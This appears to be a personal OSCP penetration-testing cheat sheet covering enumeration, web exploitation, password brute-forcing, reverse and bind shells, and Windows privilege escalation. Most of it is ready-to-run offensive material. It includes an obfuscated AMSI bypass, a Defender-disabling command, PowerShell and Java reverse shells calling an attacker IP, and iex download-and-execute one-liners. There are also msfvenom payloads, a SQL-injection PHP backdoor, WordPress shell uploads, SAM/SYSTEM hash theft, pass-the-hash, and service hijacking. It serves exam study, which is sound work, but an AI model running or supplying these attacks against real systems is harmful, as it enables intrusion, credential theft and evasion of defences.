# OSCP_cheatsheet
#### Other great cheatsheets
https://github.com/CountablyInfinite/oscp_cheatsheet


# Summary
* [General](#General)
   * [Buffer overflow](bufferoverflow.md)
   * [Metasploit](metasploit.md)
* [Enumeration](#Enumeration)
   * [Host Discovery](#Host-Discovery)
   * [Services](#Services)
        * [Most common ports](#Most-common-ports)
        * [Port Scanning Nmap](#port-scanning-Nmap)
   * [Web-applications](#Web-applications)
* [Exploitation](#Exploitation)
   * [Web application](#Exploitation-Web-application)
   * [FTP](#FTP)
   * [Password Attacks](#Password-Attacks)
   * [SMB and NETBIOS](#SMB-and-NETBIOS)
   * [NFS Shares](#NFS-Shares)
   * [All the Shells](#Shells)
* [Local privilege escalation](#Local-privilege-escalation)
   * [Windows](#Windows)
   * [Linux](#Linux)
* [Post Exploitation](#Post-Exploitation)
   * [Lateral Movement](#Lateral-Movement)
    
# General
#### Python error
When receiving the error “/usr/bin/env: ‘python\r’: No such file or directory when running an python exploit.
1.	Open the python file in vim
2.	Use the command ```:set ff=unix```
3.	Save the file. ```:wq```

#### SSH key files
ssh key files needs to be permission 600
```
sudo chmod 600 <FILE>
```

#### RDP commands
```
xfreerdp /d:<DOMAIN> /u:<USERNAME> /v:<TARGET IP< +clipboard
```

## cmd
#### Find string
```
| findstr /I “<FIND STRING>”
```

#### Ignore string
```
| findstr /v “<IGNORE STRING>” 
```

## Powershell
#### Powershell flags
- ```-nop```: (```-noprofile```) which instructs powershell not to load the powershell user profile.
-	```-w hidden```: to avoid creating a window on the user’s desktop
-	```-e```: (```-EncodedCommand```) use base64 encoding

#### Start as admin
```
powershell.exe Start-Process cmd.exe -Verb runAs
```

#### AMSI Bypass
```
sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
```

#### Disbale AV (Requires local admin)
```
Set-MpPreference -DisableRealtimeMonitoring $true
```

### Powershell execution policy
#### Get execution policy
```
Get-ExecutionPolicy -Scope CurrentUser
```

#### Bypass execution policy flag
```
-ExecutionPolicy Bypass
```

#### Disable execution policy
```
Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
```

## Compiling
#### Compile on linux
```
gcc
```

#### Cross compile exploit code
```
sudo apt install mingw-64
```

#### Compile 32bit
```
i686-w64-mingw32-gcc something.c -o something
```

# Enumeration
## Host Discovery
#### NMAP ping sweep
```
sudo nmap -sn <RANGE>
```

#### Netdiscover
```
sudo netdiscover -r <RANGE>
sudo netdisover -i <INTERFACE>
```

## Services / Port Scanning
### Most common ports
```
21: ftp
22: ssh
23: telnet
25: smtp
53: domain name system
80: http
110: pop3
111: rpcbind
135: msrpc
139: netbios-ssn
143: imap
443: https
445: microsoft-ds
993: imaps
995: pop3s
1723: pptp
3306: mysql
3389: ms-wbt-server
5900: vnc
8080: http-proxy
```

### Port scanning Nmap
#### Full TCP port scan
```
nmap <TARGET> -sV -sC -O -p- -vv -oA full_tcp_-<TARGET> 
```

#### Full UDP port scan
```
nmap <TARGET> -sU -sV -sC -p- -vv -oA full_udp_-<TARGET> 
```

#### Nmap scan most common ports wiht no host discovery
```
nmap <TARGET> -p 20,21,22,25,80,443,111,135,139,443,8080 -oA portsweep-<TARGET> 
nmap <TARGET> --top-ports 25 -oA portsweep_top25-<TARGET> 
```

#### Nmap scan all vulnerabilities
```
nmap <TARGET> -p- --script vuln -vv -oA vulnscan_-<TARGET> 
```

#### Usefull flags
- ```-Pn``` No ping #use if host says down but you know its up)
- ```-sn``` No port scan #use if you just want to scan a range to check if hosts are up.

#### HTTP Openproxy
If there is an open HTTP proxy, connect to it by configuring a proxy in your browser.

## Autorecon
https://github.com/Tib3rius/AutoRecon
```
autorecon -vv <IP>
```

## Web-applications
- Check the file extensions in URL’s to see what the application is running (.net .aspx .php etc)
- Inspect page content
- Check Firefox debugger for outdated javascript libraries
- Look for /robots.txt and /sitemap.xml

#### Find subdomains from html pages
```
curl <WEBPAGE>
grep -o '[^/]*\.<DOMAIN>\.com' index.html | sort -u > subdomains.txt
```

#### Screenshot a lot of http pages
Collect screenshot from list of ips
```
for ip in $(cat <IP FILE>); do cutycapt --url=$ip --out=$ip.png;done
```

Run the following bash script
```
#!/bin/bash
# Bash script to examine the scan results through HTML.
echo "<HTML><BODY><BR>" > web.html
ls -1 *.png | awk -F : '{ print $1":\n<BR><IMG SRC=\""$1""$2"\" width=600><BR>"}' >> w
eb.html
echo "</BODY></HTML>" >> web.html
```

### Vulnerability scanning - Nikto
Nikto is used for vulnerability scanning a web application.
```
nikto -host <URL> -output nikto-URL.txt
```

### Directory fuzzing
#### Dirb parameters
- ```-R``` to disable recursive scanning
- ```-p``` set up a proxy <IP:PORT>
- ```-X``` Append each word with this extensions.

#### Dirb Quick scan
```
dirb <URL> /usr/share/dirb/wordlists/big.txt -o dirb-<URL>.txt
```

#### Dirb Big wordlist
```
dirb <URL> /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -o dirb-<URL>.txt
```

#### Gobuster parameters
- use the ```-b``` flag to blacklist status codes.

#### Gobuster Quick scan
```
gobuster dir -w /opt/SecLists/Discovery/Web-Content/big.txt -u <URL> gobuster-<URL>.txt
```

#### Gobuster Big wordlist
```
gobuster dir -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u <URL> gobuster-<URL>.txt
```

### Wordpress
#### Scan Wordpress
```
wpscan -url <URL>
```

#### Bruteforce login
```
wpscan --url <URL> --usernames <USERNAME> --passwords /usr/share/wordlists/rockyou.txt --max-threads 50
```

#### Upload a reveare shell
1. Login --> Appearance --> Theme editor --> 404.php
2. gedit /usr/share/webshells/php/php-reverse-shell.php
3. Paste in 404.php
4. Start listener and go to an unexisting page in the browser

### Jenkings
#### Execute commands
- After login go to /script

#### Reverse java shell
```
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<IP>/<PORT>;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

### SMTP
#### Enumerate emails accounts
```
nc -nv <IP> 25
VRFY root
VRFY idontexist
Check output
```

### Shares SMB
#### Nmap enumerate SMB shares
```
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse <IP>
```

#### Enum4linux
Gotta try this: https://github.com/cddmp/enum4linux-ng
```
enum4linux <IP>
```


#### SMBClient list shares
```
smbclient -L <IP>
smbclient -L <IP>  -U '<USER>'%'<PASS>'
```

#### SMBClient connect to share
```
smbclient //<IP>/<SHARE>
```

#### SMBClient connect to share
```
smbclient //<IP>/<SHARE>
```

#### Download smb files recursively
```
get <FILE NAME>-
smbget -R smb://<IP>/<SHARE>
```

### Shares RPC
#### Nmap enumerate RPC shares
```
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount <IP>
```

### General
#### Find dangerous HTTP methods
https://www.sans.org/reading-room/whitepapers/testing/penetration-testing-web-application-dangerous-http-methods-33945
```
curl -v -X OPTIONS http://website/directory
#HTTP options such as PUT, Delete are bad
```

# Exploitation
## Exploitation Web application
### General
When modifying web exploits, there are several key questions we generally need to ask while approaching the code:
-	Does it initiate an HTTP or HTTPS connection?
-	Does it access a web application specific path or route?
-	Does the exploit leverage a pre-authentication vulnerability?
-	If not, how does the exploit authenticate to the web application?
-	How are the GET or POST requests crafted to trigger and exploit the vulnerability?
-	Does it rely on default application settings (such as the web path of the application) that may have been changed after installation?
-	Will oddities such as self-signed certificates disrupt the exploit?

### SQL Injection
- Use ‘ and “ to look for possible errors
- use # and -- for comments after the injection.
- If returning multiple rows gives errors use ```LIMIT 1``` in the query
- use ```ORDER BY``` to find the amount of columns. Increment it by 1 till no output is shown.
- use ```load_file('C:/Windows/System32/drivers/etc/hosts')``` to load files instead of database data.
- use ```"<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE '<PATH TO WEBROOT>/backdoor.php'``` to create a simple php backdoor.

#### MYSQL Commands
```
show grants;
show variables;
show databases;
use <DATABASE>;
show tables;
describe <TABLE>;
SELECT * FROM <TABLE>;
```

### File upload
#### File upload intruder extensions list
```
/opt/SecLists/Discovery/Web-Content/web-extensions.txt
```

## FTP
- Check if login is allowed as anonymous:anonymous.

## Password Attacks
https://github.com/danielmiessler/SecLists
#### Hydra bruteforce FTP
```
hydra -L <USERNAMEFILE> -P <PASSWORDFILE> -t 24 ftp://<IP>:<PORT>
```

#### Hydra bruteforce SSH
```
hydra -L <USERNAMEFILE> -P <PASSWORDFILE> -t 24 ssh://<IP>:<PORT>
```

#### Hydra bruteforce HTTP login
Login using Burp or check in developers tools to check the request for the required information! You need to get the username/password/login parameter and the error message!

https://redteamtutorials.com/2018/10/25/hydra-brute-force-https/
```
hydra -L <USERNAMEFILE> -P <PASSWORDFILE> <IP> http-post-form "<LOGINPAGE>:<COOKIES FROM BURP AND SET ^USER^ AND ^PASS^>:<ERROR MESSAGE FAILED LOGIN>"

#EXAMPLE hydra -L usernames.txt -P passwords.txt 192.168.2.62 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login Failed"

#EXAMPLE hydra -l admin -P /opt/SecLists/Passwords/xato-net-10-million-passwords-100.txt 10.10.175.0 http-post-form '/Account/login.aspx?ReturnURL=/admin:__VIEWSTATE=u8hdjDohYmqfI8o0z7Cev4b1u0jLmv9dNA9NS95wDsZeMYw6zBFeyhiLx1QuOsZ%2FXV%2Fo%2BrCdXSC4Y7%2FueaRnmboaQQ9KZQWLME84zysowmYTAW8Kea1%2Bp7phoEwMiICbLwPPteDEYl7z6nobm8x1Mb2hMDiTpDJhracgmTh%2BJwP1Rqqt&__EVENTVALIDATION=QJmkftZnDEcQIPsstxYKnQBDsulZLsB0kmrbMa4BPzAc%2FMEDChrOmztni5OWBx83r2xGNndCAgw6wJ%2F%2FoAzYtZEcyRWC%2FaPyUR5iWSO0V8%2FIodobow1OxiuoD9uZVnVO8tcQZr3NWYjFcOVxYg5WAWvPyezvfcBk2oxUdZwsutPATiKB&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:failed'
```

#### CEWL - Create a wordlist 
```
cewl <URL> -m <MIN CHARS> -w <FILE>.txt
```

#### Identify hashes
```
hashid <HAS>
hash-identiefier
```

#### Combine /etc/passwd and /etc/shadow with unshadow
```
Unshadow <PASSWD FILE> <SHADOW FILE> > unshadow.txt
```

## SMB and NETBIOS
NetBIOS is an independent session layer protocol and service that allows computers on a local network to communicate with each other. While modern implementations of SMB can work without NetBIOS, NetBIOS over TCP (NBT)211 is required for backward compatibility and is often enabled together.

#### NBTSCAN
```
sudo nbtscan -r <IP RANGE>
```

#### Nmap SMB Script
```
/usr/share/nmap/scripts/smb*
```

## NFS Shares
Portmapper and RPCBind run on TCP port 111

#### Enumerations
```
rpcinfo irked.htb
nmap -sSUC -p111 <IP>
```

#### Mount shares
```
sudo mount -o nolock <IP>:/<SHARE> <MOUNT LOCATION>
sudo mount -t cifs -o port=<PORT> //<IP>/<SHARE> -o username=<USERNAME>,password=<PASSWORD> /mnt/<FOLDER>
```

#### Open file with no permission to file
If a file found which we want to access but don’t have permissions. Make a user with the same username and change the UUID, change to the user so we can access the file.
```
sudo adduser pwn
sudo vim /etc/passwd
```

## Shells
### Listeners
#### Netcat listener
```
sudo nc -nlvp <PORT>
```

#### Socat listener
```
sudo socat -d -d TCP4-LISTEN:<PORT> STDOUT
```

#### Meterpreter listener
```
msfconsole
use multi/handler
set payload <PAYLOAD>
run
```

#### Powercat listener
```
. ./powercat.ps1
powercat -l -v -p 10000
```

### Reverse shells
#### Netcat
```
nc -nv <IP> <PORT> -e /bin/bash
```

#### Socat
```
socat TCP4:10.11.0.22:443 EXEC:/bin/bash
```

#### Powershell
```
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<IP>',<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i =$stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

```
powershell.exe iex (iwr http://<IP>/Invoke-PowerShellTcp.ps1 -usebasicparsing);Invoke-PowerShellTcp -Reverse -IPAddress <IP> -Port <PORT>
```

```
powershell iex (New-Object Net.WebClient).DownloadString('http://<IP>/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress <IP> -Port <PORT>
```

#### Powercat
```
powercat -c <IP> -p <PORT> -e cmd.exe
```

### Bind shells
#### Netcat
```
nc -nlvp <PORT>
```

#### Powershell
```
powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('<IP>',<PORT>);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'P
```

#### Powercat
```
powercat -l -p <PORT> -e cmd.exe
```

### Spawn TTY Shells
```
python -c 'import pty; pty.spawn("/bin/sh")'
```

```
echo os.system('/bin/bash')
```

```
/bin/sh -i
```

```
perl —e 'exec "/bin/sh";'
```

```
perl: exec "/bin/sh";
```

```
ruby: exec "/bin/sh"
```

#### Enable tab completion
1. In your active shell press ```bg``` to send your nc session to background
2. Enter ```stty raw -echo```
3. Enter ```fg``` to bring your nc session to foreground
4. ```export TERM=xterm-256color``

# Local privilege escalation
Exploit binaries
- Linux https://gtfobins.github.io/
- Windows https://lolbas-project.github.io/

Static binaries
- https://github.com/andrew-d/static-binaries

## Windows
### General tips
- Windows check if Windows Scheduler is running (```tasklist```)
  - Go to C:\Program files (x65)\SystemScheduler\Events and check the logs to see if anything is running every x minutes.
  - Check if we got write permissions
- Administrative command execution tips
  - Use msfvenom for shells if we can execute something with admin privileges
     - ```msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o reverse.exe```
     - ```msfvenom -p windows/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o reverse.exe```
  - RDP
     - ```net localgroup administrators <username> /add```
  - Admin --> System
    - ```.\PsExec64.exe -accepteula -i -s C:\temp\reverse.exe```
    - https://docs.microsoft.com/en-us/sysinternals/downloads/psexec

### Tools
#### Powerup & SharpUp
- https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1
- https://github.com/GhostPack/SharpUp

```
powershell.exe
. ./PowerUp.ps1
Invoke-Allchecks
```

```
.\SharpUp.exe
```

#### Seatbelt
https://github.com/GhostPack/Seatbelt

```
./seatbelt.exe all
```

#### winPEAS
https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS

```
reg add HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
.\winPEASany.exe quiet cmd fast
.\winPEASany.exe
```

#### accesschk.exe
AccessChk is an old but still trustworthy tool for checking user access control rights. You can use it to check whether a user or group has access to files, directories, services, and registry keys. The downside is more recent versions of the program spawn a GUI “accept EULA” popup window. When using the command line, we have to use an older version which still has an /accepteula command line option.

### Manual Enumeration 
#### Check the current user
```
whoami
```

#### Check all the users
```
net user
```

#### Check hostname
```
hostname
```

#### Check operatingsystem and architecture
```
systeminfo
```

#### Check Running processes
```
tasklist /svc
```

#### Check running services
```
wmic service get name,displayname,pathname,startmode
```

#### Check permission on file
```
icalcs "<PATH>"
```

#### Check current privileges
```
whoami /priv; whoami /groups
```
if SeImpersonatePrivilege is set (https://github.com/itm4n/PrintSpoofer or juicypotato)

#### Check networking information
```
ipconfig /all
route print
```

#### Check open ports
```
netstat -ano
```

#### Enumerate firewall
```
netsh advfirewall show currentprofile
netsh advfirewall firewall show rule name=all
```

#### Enumerate scheduled task
```
schtasks /query /fo LIST /v
```

#### Installed applications and patch levels
```
wmic product get name, version, vendor
```

#### Readable/writable files and directories
```
accesschk.exe -uws "Everyone" "C:\Program Files"
Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}
```

#### Unmounted disks
```
cat /etc/fstab
mount
/bin/lsblk
mountvol
```

#### Device drivers and kernal modules
```
driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object ‘Display Name’, ‘Start Mode’, Path
Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*<DRIVER>*"}
```

#### Binaries that auto elevate
Check status of AlwaysInstalledElevated registery setting (if yes then craft a MSI)
```
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
```

#### Check the architecture
```
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
```

#### Check for drivers
```
driverquery /v
```

#### Check the driver files for version etc and check if it’s vulnerable
```
cd C:\Program Files\<DRIVER>
```

### Privilege escalation techniques
Run winPEAS and if it find something fuzzy use these techniques to exploit it.

### Kernel exploits
Kernels are the core of any operating system. Think of it as a layer between application software and the actual computer hardware. The kernel has complete control over the operating system. Exploiting a kernel vulnerability can result in execution as the SYSTEM user.

1. Enumerate Windows version / patch level (systeminfo)
2. Find matching exploits (Google, ExploitDB, Github)
3. Compile and run

#### Finding kernal exploits
- https://github.com/bitsadmin/wesng
- https://github.com/rasta-mouse/Watson
- Pre compiled Kernal exploits
  - https://github.com/SecWiki/windows-kernel-exploits
  
#### Get systeminfo
```
systeminfo > systeminfo.txt
```

### Run on kali
```
python wes.py systeminfo.txt -i 'Elevation of privilege' --exploits-only
```

#### Cross-reference results with compiled exploits + run them
https://github.com/SecWiki/windows-kernel-exploits

### Service Exploits
Services are simply programs that run in the background, accepting input or performing regular tasks. If services run with SYSTEM privileges and are misconfigured, exploiting them may lead to command execution with SYSTEM privileges as well.

#### Query the configuration of a service:
```
sc.exe qc <SERVICE NAME>
```

#### Query the current status of a service:
```
sc.exe query <SERVICE NAME>
```

#### Modify a configuration option of a service:
```
sc.exe config >NAME> <OPTION>= <VALUE>
```

#### Start/Stop a service:
```
net start/stop <SERVICE NAME>
```

### Service Exploits - Insecure Service Properties
Each service has an ACL which defines certain service-specific permissions. Some permissions are innocuous (e.g. SERVICE_QUERY_CONFIG, SERVICE_QUERY_STATUS). Some may be useful (e.g. SERVICE_STOP, SERVICE_START). Some are dangerous (e.g. SERVICE_CHANGE_CONFIG, SERVICE_ALL_ACCESS).

If our user has permission to change the configuration of a service which runs with SYSTEM privileges, we can change the executable the service uses to one of our own. Potential Rabbit Hole: If you can change a service configuration but cannot stop/start the service, you may not be able to escalate privileges!

#### Confirm with accesschk.exe
```
.\accesschk.exe /accepteula -uwcqv <USER> <SERVICE NAME>
```

#### Check the current configuration of the service:
```
sc qc daclsvc
```

#### Check current status of the service
```
sc query daclsvc
```

#### Reconfigure the service to use our reverse shell executable:
```
sc config daclsvc binpath= "\"C:\temp\reverse.exe\""
```

#### Start a listener on Kali, and then start the service to trigger the exploit:
```
net start daclsvc
```

### Unqouted Service Path
Executables in Windows can be run without using their extension (e.g. “whoami.exe” can be run by just typing “whoami”). Some executables take arguments, separated by spaces, e.g. someprog.exe arg1 arg2 arg3… This behavior leads to ambiguity when using absolute paths that are unquoted and contain spaces.

Consider the following unquoted path: ```C:\Program Files\Some Dir\SomeProgram.exe``` To us, this obviously runs ```SomeProgram.exe```. To Windows, ```C:\Program``` could be the executable, with two arguments: ```Files\Some``` and ```Dir\ SomeProgram.exe``` Windows resolves this ambiguity by checking each of the possibilities in turn. If we can write to a location Windows checks before the actual executable, we can trick the service into executing it instead.

#### Confirm this using sc:
```
sc qc <SERVICE NAME>
```

#### Use accesschk.exe to check for write permissions:
```
.\accesschk.exe /accepteula -uwdq "<PATH WITH SPACE>"
.\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
```

#### Copy the reverse shell executable and rename it appropriately:
```
copy C:\temp\reverse.exe "<PATH>"
```

#### Start a listener on Kali, and then start the service to trigger the exploit:
```
net stop <SERVICE>
net start <SERVICE>
```

### Weak registry permissions
The Windows registry stores entries for each service. Since registry entries can have ACLs, if the ACL is misconfigured, it may be possible to modify a service’s configuration even if we cannot modify the service directly.

#### We can confirm a weak registery entry with:
a. Powershell
   - ```Get-Acl <REG PATH> | Format-List```
B. accesschk.exe
   - ```.\accesschk.exe /accepteula -uvwqk <REG PATH>```

#### Overwrite the <VALUE> of registry key to point to our reverse shell executable:
```
reg add <REG PATH> /v <REG VALUE> /t REG_EXPAND_SZ /d C:\temp\reverse.exe /f
```

#### Start a listener on Kali, and then start the service to trigger the exploit:
```
net stop <SERVICE>
net start <SERVICE>
```

### Insecure Service Executables
If the original service executable is modifiable by our user, we can simply replace it with our reverse shell executable. Remember to create a backup of the original executable if you are exploiting this in a real system!

#### Check if executable is writable
```
.\accesschk.exe /accepteula -quvw "<PATH TO EXE>"
```

#### Create a backup of the original service executable:
```
copy "<PATH>" C:\Temp
```

#### Copy the reverse shell executable to overwrite the service executable:
```
copy /Y C:\PrivEsc\reverse.exe "<PATH>"
```

#### Start a listener on Kali, and then start the service to trigger the exploit:
```
net stop <SERVICE>
net start <SERVICE>
```

#### DLL Hijacking
Often a service will try to load functionality from a library called a DLL (dynamic-link library). Whatever functionality the DLL provides, will be executed with the same privileges as the service that loaded it. If a DLL is loaded with an absolute path, it might be possible to escalate privileges if that DLL is writable by our user.

A more common misconfiguration that can be used to escalate privileges is if a DLL is missing from the system, and our user has write access to a directory within the PATH that Windows searches for DLLs in. Unfortunately, initial detection of vulnerable services is difficult, and often the entire process is very manual 

#### Check for a writable directory that is in path
Start by enumerating which of these services our user has stop and start access to:
```
.\accesschk.exe /accepteula -uvqc <USER> <SERVICE>
```

#### Confirm output of winpeas if DLL is vulnerable
```
sc qc <SERVICE>
```

1. Run Procmon64.exe with administrator privileges. Press Ctrl+L to open the Filter menu.
2. Add a new filter on the Process Name matching NAME.exe.
3. On the main screen, deselect registry activity and network activity.
4. Start the service:
5. Back in Procmon, note that a number of “NAME NOT FOUND” errors appear, associated with the .dll file.
6. At some point, Windows tries to find the file in the C:\Temp directory, which as we found earlier, is writable by our user.

#### On Kali, generate a reverse shell DLL named hijackme.dll:
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f dll -o <NAME>.dll
msfvenom -p windows/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f dll -o <NAME>.dll
```

#### Copy the DLL to the Windows VM and into the C:\Temp directory. Start a listener on Kali and then stop/start the service to trigger the exploit:
```
net stop <SERVICE>
net start <SERVICE>
```

### Registery
#### Autoruns
Windows can be configured to run commands at startup, with elevated privileges. These “AutoRuns” are configured in the Registry. If you are able to write to an AutoRun executable, and are able to restart the system (or wait for it to be restarted) you may be able to escalate privileges.

#### Enumerate autorun executables
```
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```

#### Check executables manually
```
.\accesschk.exe /accepteula -wvu "<PATH TO EXE>"
```

#### If an autorun executable is found, make a copy
```
copy "C:\Program Files\Autorun Program\program.exe" C:\Temp
```

#### Copy reverse shell to overwrite the autorun executable:
```
copy /Y C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe"
```

#### Start a listener on Kali, and then restart the Windows VM to trigger the exploit.
Note that on Windows 10, the exploit appears to run with the privileges of the last logged on user, so log out of the “user” account and log in as the “admin” account first.

### AlwaysInstallElevated
MSI files are package files used to install applications. These files run with the permissions of the user trying to install them. Windows allows for these installers to be run with elevated (i.e. admin) privileges. If this is the case, we can generate a malicious MSI file which contains a reverse shell.

The catch is that two Registry settings must be enabled for this to work. The “AlwaysInstallElevated” value must be set to 1 for both the local machine: HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer and the current user: HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer If either of these are missing or disabled, the exploit will not work.

#### Manually check
```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Mi
```

#### Create a reverse shell with msfvenom
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f msi -o reverse.msi
msfvenom -p windows/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f msi -o reverse.msi
```

#### Copy the reverse.msi across to the Windows VM, start a listener on Kali, and run the installer to trigger the exploit:
```
msiexec /quiet /qn /i C:\temp\reverse.msi
```

### Passwords
Yes, passwords. Even administrators re-use their passwords, or leave their passwords on systems in readable locations. Windows can be especially vulnerable to this, as several features of Windows store passwords insecurely.

#### Registery
Plenty of programs store configuration options in the Windows Registry. Windows itself sometimes will store passwords in plaintext in the Registry. It is always worth searching the Registry for passwords. The following commands will search the registry for keys and values that contain “password”

```
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

#### Spawn shell using credentials
```
winexe -U '<USERNAME>%<PASSWORD>' //<IP> cmd.exe
```

#### Saved creds
Windows has a runas command which allows users to run commands with the privileges of other users. This usually requires the knowledge of the other user’s password. However, Windows also allows users to save their credentials to the system, and these saved credentials can be used to bypass this requirement.

#### Manually check for saved credentials
```
cmdkey /list
```

#### Use saved credentials
```
runas /savecred /user:admin C:\temp\reverse.exe
```

#### Configuration Files
```
Some administrators will leave configurations files on the system with passwords in them. The Unattend.xml file is an example of this. It allows for the largely automated setup of Windows systems.
```

#### Manually search
```
dir /s *pass* == *.config
findstr /si password *.xml *.ini *.txt
```

#### SAM
Windows stores password hashes in the Security Account Manager (SAM). The hashes are encrypted with a key which can be found in a file named SYSTEM. If you have the ability to read the SAM and SYSTEM files, you can extract the hashes. Located in: ```C:\Windows\System32\config directory.``` or ```C:\Windows\Repair``` or  ```C:\Windows\System32\config\RegBack directories```

#### Copy them to kali
```
copy C:\Windows\Repair\SAM \\<IP>\<SHARE>\
copy C:\Windows\Repair\SYSTEM \\<IP>\<SHARE>\
```

#### Run creddump pdump.py
https://github.com/Neohapsis/creddump7.git
```
python2 creddump7/pwdump.py SYSTEM SAM
```

#### Crack with hashcat
```
hashcat -a 0 -m 1000 --force <HASHES> <WORDLIST>
```

#### Pass the hash login
```
pth-winexe -U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //<IP> cmd.exe
pth-winexe --system -U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //<IP> cmd.exe
```

### Scheduled tasks
Windows can be configured to run tasks at specific times, periodically (e.g. every 5 mins) or when triggered by some event (e.g. a user logon). Tasks usually run with the privileges of the user who created them, however administrators can configure tasks to run as other users, including SYSTEM.

#### List all scheduled tasks
```
schtasks /query /fo LIST /v
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
```

### Insecure GUI Apps
On some (older) versions of Windows, users could be granted the permission to run certain GUI apps with administrator privileges. There are often numerous ways to spawn command prompts from within GUI apps, including using native Windows functionality. Since the parent process is running with administrator privileges, the spawned command prompt will also run with these privileges. I call this the “Citrix Method” because it uses many of the same techniques used to break out of Citrix environments.

#### If you cna open a file with this app go to the explorer and fill in
```
file://c:/windows/system32/cmd.exe
```

### Startup apps
Each user can define apps that start when they log in, by placing shortcuts to them in a specific directory. Windows also has a startup directory for apps that should start for all users: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp If we can create files in this directory, we can use our reverse shell executable and escalate privileges when an admin logs in.

Note that shortcut files (.lnk) must be used. The following VBScript can be used to create a shortcut file.

#### Use accesschk.exe to check permissions on the StartUp directory:
```
.\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
```

#### Create a file CreateShortcut.vbs with the VBScript provided. Change file paths if necessary.
```
Set oWS = WScript.CreateObject("WScript.Shell")
sLinkFile = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.lnk"
Set oLink = oWS.CreateShortcut(sLinkFile)
oLink.TargetPath = "C:\PrivEsc\reverse.exe"
oLink.Save
```

#### Run the script using cscript
```
cscript CreateShortcut.vbs
```

#### Start listener if admin logs == shell

### Installed applications
Most privilege escalations relating to installed applications are based on misconfigurations we have already covered. Still, some privilege escalations results from things like buffer overflows, so knowing how to identify installed applications and known vulnerabilities is still important.

#### Manually enumerate all running programs:
```
tasklist /v
```

#### Use seatbelt or winPEAS to enumerate nonstandard processes
```
.\seatbelt.exe NonstandardProcesses
.\winPEASany.exe quiet procesinfo
```

### Hot potato
Hot Potato is the name of an attack that uses a spoofing attack along with an NTLM relay attack to gain SYSTEM privileges. The attack tricks Windows into authenticating as the SYSTEM user to a fake HTTP server using NTLM. The NTLM credentials then get relayed to SMB in order to gain command execution. This attack works on Windows 7, 8, early versions of Windows 10, and their server counterparts.

1. Copy the potato.exe exploit executable over to Windows.
2. Start a listener on Kali.
